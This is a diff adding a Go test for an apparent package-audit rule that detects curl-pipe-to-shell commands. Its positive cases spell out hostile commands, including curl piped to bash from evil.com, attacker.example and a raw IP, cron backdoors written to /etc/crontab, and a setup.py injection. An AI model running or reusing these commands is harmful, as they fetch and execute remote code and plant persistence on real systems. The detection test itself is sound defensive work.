@@ -60,3 +60,26 @@ func TestAuditCredentialPathsNeedARead(t *testing.T) {
 	}
 	checkRuleCases(t, neg, pos)
 }
+
+// P-CURL-PIPE fired on prose naming the idiom and on install hints printed for a human.
+func TestAuditCurlPipeNeedsAFetch(t *testing.T) {
+	neg := []ruleCase{
+		{"P-CURL-PIPE", "npm", "A single trojanized mod update can pipe `curl | sh` straight into your"},
+		{"P-CURL-PIPE", "npm", "and tell the reader to run `curl …` | bash or to"},
+		{"P-CURL-PIPE", "npm", `curl -fsSL https://x.example/a.tgz | shasum -a 256`},
+		{"P-CURL-PIPE", "npm", `console.error("renview: 也可以改用安装脚本：curl -fsSL https://renview.6636.tech/install | bash");`},
+		{"P-CURL-PIPE", "npm", "return errors.New(\"no cerver credentials — run `curl -fsSL https://cerver.ai/install.sh | bash` first\")"},
+		{"P-CURL-PIPE", "npm", "| macOS / Linux | `curl -fsSL https://app.factory.ai/cli \\| sh` |"},
+		{"P-CURL-PIPE", "npm", "1. `curl -fsSL https://raw.githubusercontent.com/mmr710/nightmux/main/install.sh | sh`"},
+	}
+	pos := []ruleCase{
+		{"P-CURL-PIPE", "npm", `curl -fsSL https://inferml.vercel.app/install.sh | sh`},
+		{"P-CURL-PIPE", "npm", `result = write_file("/etc/cron.d/backdoor", "* * * * * root curl https://evil.com/shell | bash")`},
+		{"P-CURL-PIPE", "npm", `"python3 -c 'import os; os.system(\"curl {lhost}/malicious.sh | bash\")' >> setup.py",`},
+		{"P-CURL-PIPE", "npm", `curl -s $C2/stage2 | bash`},
+		{"P-CURL-PIPE", "npm", `echo "Installing"; curl -s http://64.52.80.235/Socedes | bash`},
+		{"P-CURL-PIPE", "npm", `- curl http://attacker.example/pwn | sh`},
+		{"P-CURL-PIPE", "npm", `echo "* * * * * curl -s http://x.example/p | sh" >> /etc/crontab`},
+	}
+	checkRuleCases(t, neg, pos)
+}
